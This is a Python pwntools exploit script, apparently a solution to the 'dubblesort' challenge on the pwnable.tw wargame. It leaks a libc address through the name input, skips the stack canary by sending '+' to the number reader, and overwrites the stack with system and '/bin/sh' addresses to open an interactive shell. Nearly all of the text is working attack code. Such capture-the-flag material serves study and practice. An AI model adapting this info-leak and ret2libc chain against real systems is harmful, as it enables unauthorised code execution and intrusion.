#!/usr/bin/env python3

from pwn import *

def start():
    global p
    if args.REMOTE:
        p = remote("chall.pwnable.tw", 10101)
    else:
        p = elf.process()

context(os="linux") 
context.binary = elf = ELF("./dubblesort")
context.log_level = "debug"
start()

libc = ELF("./libc_32.so.6")

p.sendlineafter(b"What your name :", b"A"*24)
p.recvuntil(b"A" * 24)

libc_base = u32(p.recv(4)) - 0x1b000a
print(hex(libc_base))

system = libc_base + libc.symbols["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh"))

# we need to send 24 chars + funky char + system + bin_sh
length = 24 + 1 + 9 + 1

p.sendlineafter(b"to sort :", str(length))

for _ in range(24):
    p.sendlineafter(b"number : ", b"1")

# stack canary
p.sendline(b"+")

for _ in range(9):
    p.sendlineafter(b"number : ", str(system))

p.sendlineafter(b"number : ", str(bin_sh))
p.interactive()
